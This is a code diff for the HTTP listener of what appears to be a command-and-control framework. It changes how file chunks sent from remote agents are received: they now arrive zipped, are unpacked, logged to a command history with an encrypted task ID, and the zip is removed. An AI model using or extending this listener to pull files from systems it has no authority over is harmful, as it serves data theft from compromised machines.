@@ -1,16 +1,17 @@
 import sys
+import zipfile
 import threading
-
 from io import BytesIO
-from core.logger import *
-from core.crypto import *
 from random import choice
-from base64 import b64encode,b64decode
 from datetime import datetime
 from string import ascii_letters
 from multiprocessing import Process
-from os import path, getcwd
+from os import path, getcwd, remove
+from base64 import b64encode,b64decode
 from flask import Flask, render_template, request, send_from_directory
+
+from core.logger import *
+from core.crypto import *
 
 class HTTP_listener:
 
@@ -161,12 +162,12 @@ class HTTP_listener:
             part,f_hash = info.split()
 
             if part == 'init':
-                file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}')
+                file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}.zip')
                 uid = ''.join(choice(ascii_letters) for i in range(20))
                 
                 while (path.isfile(file_fpath)):
                     # what are the odds right?? xD
-                    file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}')
+                    file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}.zip')
 
                 ## create file unique ID, check if it exists already, encrypt it and send it
                 while self.stash.get_fileinfo(uid):
@@ -185,11 +186,16 @@ class HTTP_listener:
                 with open(full_path,'ab') as fwb:
                     fwb.write(b64decode(chunk))
 
-                if int(leng)-1 <= int(part):
-                    result = f'File downloaded to {full_path}'
+                if int(leng)-1 == int(part):
+                    with zipfile.ZipFile(full_path,'r') as zf:
+                            # zip_ref.extractall('/'.join(full_path.split('/')[:-1]))
+                            with open(full_path.replace('.zip',''),'wb') as fwb:
+                                fwb.write( zf.read(zf.namelist()[0]) )
+                    result = f'File downloaded to {full_path.replace(".zip","")}'
                     enc_taskid = request.form.get('taskid')
                     taskid = DECRYPT(enc_taskid,key).replace('VALID ','')
                     self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, taskid) )
+                    remove(full_path)
 
                 return ('', 204)
 
